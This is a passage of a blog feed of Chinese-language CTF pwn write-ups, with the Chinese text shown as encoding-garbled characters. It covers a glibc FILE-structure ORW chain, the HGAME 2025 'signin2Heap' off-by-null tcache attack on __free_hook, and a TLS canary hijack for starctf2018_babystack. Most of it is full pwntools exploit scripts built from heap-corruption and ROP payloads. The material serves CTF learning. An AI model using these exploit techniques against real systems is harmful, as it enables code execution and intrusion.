class="line">fake_IO_FILE  =fake_IO_FILE.ljust(0x60,b&#x27;\x00&#x27;)  </span><br><span class="line">fake_IO_FILE +=p64(0)+p64(chunk3+0xf8)+p64(system) #rdi,rsi</span><br><span class="line">fake_IO_FILE +=p64(heap_base)              </span><br><span class="line">fake_IO_FILE +=p64(0x100)                       #rdx</span><br><span class="line">fake_IO_FILE  =fake_IO_FILE.ljust(0x90, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE +=p64(chunk3+0x8)                  #_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE +=p64(chunk3+0xf0)+p64(rdi+1)      #rsp</span><br><span class="line">fake_IO_FILE +=p64(0)+p64(1)+p64(0)*2</span><br><span class="line">fake_IO_FILE +=p64(_IO_wfile_jumps+0x30)        # vtable=IO_wfile_jumps+0x10</span><br><span class="line">fake_IO_FILE +=p64(setcontext+61)+p64(chunk3+0xc8)</span><br><span class="line">fake_IO_FILE +=p64(read)</span><br><span class="line"></span><br><span class="line">edit(2,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(5))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orw  = p64(rdi) + p64(heap_base+0xea0)  </span><br><span class="line">orw += p64(rsi) + p64(0)</span><br><span class="line">orw += p64(rax)+p64(2)+p64(syscall)</span><br><span class="line"></span><br><span class="line">orw += p64(rdi) + p64(3)</span><br><span class="line">orw += p64(rsi)+p64(heap_base+0x100)</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(1)</span><br><span class="line">orw += p64(rsi)+p64(heap_base+0x100)</span><br><span class="line">orw += p64(write)+b&#x27;./flag\x00\x00&#x27;</span><br><span class="line">sl(orw)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="signin2Heap"><a href="#signin2Heap" class="headerlink" title="signin2Heap"></a>signin2Heap</h4><p>èœå•å †é¢˜ï¼Œ2.27</p><p>addï¼Œfree,showä¸‰ä¸ªåŠŸèƒ½å‡½æ•°</p><p>addä¸­å­˜åœ¨of by nullæ¼æ´ï¼Œé™åˆ¶å¤§å°&lt;0xff</p><p>å› ä¸ºaddä¼šå°†æœ€åä¸€ä¸ªå­—ç¬¦è½¬ä¸º\x00ä¼šå°†æ‰“å°å‡½æ•°æˆªæ–­</p><p>è¿™é‡Œæˆ‘ä»¬å…ˆæŠŠtcacheå¡æ»¡ï¼Œä¹‹åèƒ½å¾—åˆ°è¿›å…¥unsortdbinå †å—ï¼Œæ§åˆ¶å¥½å †å¸ƒå±€ï¼Œå°†ä¸‹ä¸€ä¸ªå †å—çš„pr_sizeå’Œpr_inuseä½ä¿®æ”¹ï¼Œé‡Šæ”¾è§¦å‘å †å—åˆå¹¶ï¼Œä¹‹åå°†ç¬¬ä¸€ä¸ªå †å—ç”³è¯·å‡ºæ¥ï¼Œlibcåœ°å€å°±ä¼šè¿›å…¥ç¬¬äºŒä¸ªå †å—ä¸­ï¼Œè¿™ä¸ªå †å—è¿˜æ²¡æœ‰é‡Šæ”¾ï¼Œæ³„éœ²å¾—åˆ°libc</p><p>ä¹‹åå†æ¬¡é€ æˆå †å—åˆå¹¶ï¼ŒåŒæ—¶ç”³è¯·å‡ºç¬¬ä¸€ä¸ªå †å—åŒ…å«ç¬¬äºŒä¸ªï¼ˆæœªé‡Šæ”¾ï¼‰fdä½ï¼Œé‡Šæ”¾ç¬¬äºŒä¸ªå †å—ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ›´æ”¹å®ƒçš„fdä½ï¼Œå®Œæˆtcachebin attackï¼Œæ”»å‡»free_hookï¼Œgetshell</p><p>åŸç†çš„è¯å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« <a href="https://www.jianshu.com/p/056c9db22d81">https://www.jianshu.com/p/056c9db22d81</a></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739887952446-796c20d1-bffb-4c3d-a316-89b6477a7889.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.27.so&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,31701)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(i,size,content):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(p32(1))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;Size: &quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">rl(&quot;Content: &quot;)</span><br><span class="line">s(content)</span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(p32(3))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(p32(2))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i,0xf8,&quot;aaaa&quot;)</span><br><span class="line"></span><br><span class="line">add(7,0xf8,&quot;aaaa&quot;)#7</span><br><span class="line">add(8,0x88,&quot;aaaa&quot;)#8</span><br><span class="line">add(9,0xf8,&quot;aaaa&quot;)#9</span><br><span class="line">add(10,0x88,&quot;aaaa&quot;)#10</span><br><span class="line">for i in range(7):</span><br><span class="line">    free(i)</span><br><span class="line">free(8)</span><br><span class="line">free(7)</span><br><span class="line"></span><br><span class="line">add(11,0x88,b&#x27;a&#x27;*0x80+p64(0x90+0x100))</span><br><span class="line"></span><br><span class="line">free(9)</span><br><span class="line">#bug()</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i,0xf8,&quot;/bin/sh\x00&quot;)</span><br><span class="line">add(7,0xf8,&quot;cccc&quot;)</span><br><span class="line">show(11)</span><br><span class="line">libc_base=get_addr64()-4111520</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">add(8,0x88,b&#x27;a&#x27;)</span><br><span class="line">add(9,0xf8,b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(8)</span><br><span class="line">free(7)</span><br><span class="line">add(12,0x88,b&#x27;a&#x27;*0x80+p64(0x90+0x100))</span><br><span class="line">free(9)</span><br><span class="line"></span><br><span class="line">add(13,0x88,b&#x27;a&#x27;)</span><br><span class="line">free(13)</span><br><span class="line">free(11)</span><br><span class="line">add(14,0xb8,b&#x27;\x00&#x27;*0x60+p64(0x100)+p64(0x90)+p64(free_hook))</span><br><span class="line">add(0,0x88,b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">add(1,0x88,p64(system))</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">2025HGAME</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>TLSåŠ«æŒè¿‡canary</title>
    <link href="https://www.thir0th.xyz/posts/d7e62ac2.html"/>
    <id>https://www.thir0th.xyz/posts/d7e62ac2.html</id>
    <published>2025-04-19T09:13:35.000Z</published>
    <updated>2025-04-19T15:57:50.249Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pth-create"><a href="#pth-create" class="headerlink" title="pth_create"></a>pth_create</h1><p>CTFwiki:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å·²çŸ¥ Canary å‚¨å­˜åœ¨ TLS ä¸­ï¼Œåœ¨å‡½æ•°è¿”å›å‰ä¼šä½¿ç”¨è¿™ä¸ªå€¼è¿›è¡Œå¯¹æ¯”ã€‚å½“æº¢å‡ºå°ºå¯¸è¾ƒå¤§æ—¶ï¼Œå¯ä»¥åŒæ—¶è¦†ç›–æ ˆä¸Šå‚¨å­˜çš„ Canary å’Œ TLS å‚¨å­˜çš„ Canary å®ç°ç»•è¿‡ã€‚</span><br></pre></td></tr></table></figure><h2 id="åŸºç¡€çŸ¥è¯†ï¼š"><a href="#åŸºç¡€çŸ¥è¯†ï¼š" class="headerlink" title="åŸºç¡€çŸ¥è¯†ï¼š"></a>åŸºç¡€çŸ¥è¯†ï¼š</h2><p><a href="https://xz.aliyun.com/t/13074?time__1311=GqmhBKqIxGxBMx%2BoEDcWwP%2B34R2PoD">TLS_bypass_Canary - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://www.cnblogs.com/CH13hh/p/18296983">åŠ«æŒTLSç»•è¿‡canary &amp;&amp; å †å’Œæ ˆçš„çµæ´»è½¬æ¢ - CH13hh - åšå®¢å›­ (cnblogs.com)</a></p><font style="color:rgb(35, 38, 59);">ä»€ä¹ˆæ˜¯TLScanaryï¼Ÿ</font><font style="color:rgb(35, 38, 59);">TLScanary æ˜¯ä¸€ç§åœ¨ Pwnï¼ˆä¸»è¦æ˜¯äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ï¼‰ä¸­å¸¸è§çš„æŠ€æœ¯ï¼Œä¸“é—¨ç”¨äºå¤„ç† TLS ä¿æŠ¤çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚åœ¨å®‰å…¨ç«èµ›ï¼ˆä¾‹å¦‚ CTFï¼‰å’Œæ¼æ´åˆ©ç”¨åœºæ™¯ä¸­ï¼Œæ”»å‡»è€…éœ€è¦åº”å¯¹ç›®æ ‡ç¨‹åºçš„å¤šå±‚å®‰å…¨æœºåˆ¶ï¼Œå…¶ä¸­ TLS æ˜¯ä¸€ç§å¸¸è§çš„ä¿æŠ¤æªæ–½ã€‚TLScanary ç»“åˆäº† TLS åè®®ä¸å †æ ˆä¿æŠ¤ï¼ˆstack canaryï¼‰æŠ€æœ¯ï¼Œå¢åŠ äº†æ”»å‡»éš¾åº¦ã€‚</font><font style="color:rgb(35, 38, 59);">å¯è§TLSå’Œcanaryæœ‰ç€ä¸å¯åˆ†å‰²çš„å…³ç³»</font><font style="color:rgb(35, 38, 59);">TLSçš„åŸºæœ¬æ¦‚å¿µï¼ˆpwn canaryä¸­ï¼‰</font><font style="color:rgb(35, 38, 59);">TLS æ˜¯ä¸€ç§ç”¨äºåœ¨çº¿ç¨‹æœ¬åœ°å­˜å‚¨æ•°æ®çš„æœºåˆ¶ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„ TLS åŒºåŸŸï¼Œç”¨äºå­˜å‚¨ä¸è¯¥çº¿ç¨‹ç›¸å…³çš„ç‰¹å®šæ•°æ®ã€‚</font><font style="color:rgb(35, 38, 59);">åœ¨å †æ ˆä¿æŠ¤æ–¹é¢ï¼ŒTLS å¸¸è¢«ç”¨äºå­˜å‚¨å †æ ˆ canary å€¼ï¼Œè¿™æ˜¯ä¸€ç§é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºæ”»å‡»çš„å®‰å…¨æªæ–½ã€‚</font><font style="color:rgb(35, 38, 59);">å †æ ˆ canary æ˜¯ä¸€ç§åœ¨å‡½æ•°è¿”å›åœ°å€ä¹‹å‰æ’å…¥çš„ç‰¹æ®Šå€¼ï¼Œç”¨äºæ£€æµ‹å †æ ˆæº¢å‡ºã€‚å¦‚æœç¼“å†²åŒºæº¢å‡ºè¦†ç›–äº† canary å€¼ï¼Œç¨‹åºä¼šåœ¨è¿”å›å‰æ£€æµ‹åˆ°ä¸ä¸€è‡´ï¼Œå¹¶ç»ˆæ­¢æ‰§è¡Œï¼Œé˜²æ­¢æ¶æ„ä»£ç æ‰§è¡Œã€‚</font><font style="color:rgb(35, 38, 59);">å…¶å®å¯¹äºå¤šçº¿ç¨‹çš„canaryæ¥è¯´ï¼Œæ¯ä¸ªçº¿ç¨‹çš„canaryéƒ½æ˜¯ç‹¬ç«‹å­˜åœ¨çš„ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹è¢«åˆ›å»ºæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šä¸ºè¯¥çº¿ç¨‹åˆ†é…ä¸€ä¸ªç‹¬ç«‹çš„ TLS åŒºåŸŸã€‚è¿™ä¸ªåŒºåŸŸé€šå¸¸é€šè¿‡æŸç§çº¿ç¨‹æ§åˆ¶å—ï¼ˆTCBï¼‰æ¥ç®¡ç†ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªç‹¬ç«‹çš„ TCBã€‚</font><font style="color:rgb(35, 38, 59);">åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹çš„å †æ ˆä¸Šéƒ½ä¼šæœ‰ä¸€ä¸ªç‹¬ç«‹çš„ canary å€¼ã€‚æ“ä½œç³»ç»Ÿæˆ–è¿è¡Œæ—¶åº“åœ¨ä¸ºæ¯ä¸ªçº¿ç¨‹åˆ†é…å †æ ˆæ—¶ï¼Œä¼šåœ¨å †æ ˆçš„é€‚å½“ä½ç½®æ’å…¥ä¸€ä¸ª canary å€¼ã€‚</font><font style="color:rgb(77, 77, 77);">pthread_create è¯´ç™½äº†å°±æ˜¯çº¿ç¨‹idæ”¾ä¸‹äº†æ•°ç»„ï¼Œç„¶ååˆ›å»ºçš„çº¿ç¨‹èµ°starté‚£ä¸ªå‡½æ•°</font><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;pthread.h&gt;</span></span><br><span class="line"><span class="built_in">int</span> pthread_create(</span><br><span class="line">                 pthread_t *restrict tidp,   //æ–°åˆ›å»ºçš„çº¿ç¨‹IDæŒ‡å‘çš„å†…å­˜å•å…ƒã€‚</span><br><span class="line">                 const pthread_attr_t *restrict attr,  //çº¿ç¨‹å±æ€§ï¼Œé»˜è®¤ä¸ºNULL</span><br><span class="line">                 void *(*start_rtn)(void *), //æ–°åˆ›å»ºçš„çº¿ç¨‹ä»start_rtnå‡½æ•°çš„åœ°å€å¼€å§‹è¿è¡Œ</span><br><span class="line">                 void *restrict arg //é»˜è®¤ä¸ºNULLã€‚è‹¥ä¸Šè¿°å‡½æ•°éœ€è¦å‚æ•°ï¼Œå°†å‚æ•°æ”¾å…¥ç»“æ„ä¸­å¹¶å°†åœ°å€ä½œä¸ºargä¼ å…¥ã€‚</span><br><span class="line">                  );</span><br><span class="line"></span><br></pre></td></tr></table></figure><font style="color:rgb(77, 77, 77);">pthread_join ä½¿ä¸€ä¸ªçº¿ç¨‹ç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹ç»“æŸ</font><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> pthread_join(pthread_t thread, void **value_ptr);</span><br><span class="line">threadï¼šç­‰å¾…é€€å‡ºçº¿ç¨‹çš„çº¿ç¨‹å·ã€‚</span><br><span class="line">value_ptrï¼šé€€å‡ºçº¿ç¨‹çš„è¿”å›å€¼ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="é€‚ç”¨æ¡ä»¶ï¼š"><a href="#é€‚ç”¨æ¡ä»¶ï¼š" class="headerlink" title="é€‚ç”¨æ¡ä»¶ï¼š"></a>é€‚ç”¨æ¡ä»¶ï¼š</h2><p>pth_createåˆ›é€ çš„å­è¿›ç¨‹ä¸­å¯ä»¥æº¢å‡ºå¤§é‡å­—èŠ‚ï¼Œä¸€èˆ¬ä¸º0x900,è¦è¦†ç›–fs+0x28çš„canary</p><p>ä¸€èˆ¬ç»“åˆæ ˆè¿ç§»æ¥ä½¿ç”¨</p><p>è°ƒè¯• fsbase</p><p><a href="https://grxer.github.io/2023/03/26/TLS-Hijack/">TLSåŠ«æŒè¿‡canary(TLS Hijack Bypass Canary) (grxer.github.io)</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1723553204255-5891a608-40d4-44c2-8f34-4e8e3c105e61.png" alt=""></p><h2 id="æ¥ä¸ªä¾‹é¢˜"><a href="#æ¥ä¸ªä¾‹é¢˜" class="headerlink" title="æ¥ä¸ªä¾‹é¢˜"></a>æ¥ä¸ªä¾‹é¢˜</h2><font style="color:rgb(33, 37, 41);">starctf2018_babystack</font><font style="color:rgb(33, 37, 41);">æœ‰ä¸ª0x10000çš„æº¢å‡ºå­—èŠ‚ï¼Œè¦†ç›–åæ‰§è¡Œæ ˆè¿ç§»æ³„éœ²libc_baseï¼ŒæŠŠæ ˆè¿åˆ°bsså¹¶æ„é€ ä¸€æ¬¡readï¼Œæœ€åæ‰“one_gadget</font><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1723553119658-84a5b867-3214-4ac8-8539-f3587b4cc188.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1723553129176-c0e06097-1dd6-412a-8f56-5c8d1fda0424.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">pr = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/root/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>)    </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.27.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,28835)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss=<span class="number">0x602010</span></span><br><span class="line">leave_ret=<span class="number">0x400A9B</span></span><br><span class="line">rdi=<span class="number">0x0000000000400c03</span></span><br><span class="line">rsi_r15=<span class="number">0x0000000000400c01</span></span><br><span class="line">rl(<span class="string">&quot;How many bytes do you want to send?&quot;</span>)</span><br><span class="line">bug()</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0x1900</span>))</span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1010</span>+p64(bss-<span class="number">8</span>)+p64(rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0</span>)+p64(rsi_r15)+p64(bss)+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(leave_ret)</span><br><span class="line">payload=payload.ljust(<span class="number">0x1900</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line">libc_base=get_addr64()-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pr(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">ogg=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget=libc_base+ogg[<span class="number">2</span>]</span><br><span class="line">s(p64(one_gadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><font style="color:rgb(35, 38, 59);"></font><font style="color:rgb(35, 38, 59);"></font>]]></content>
    
    
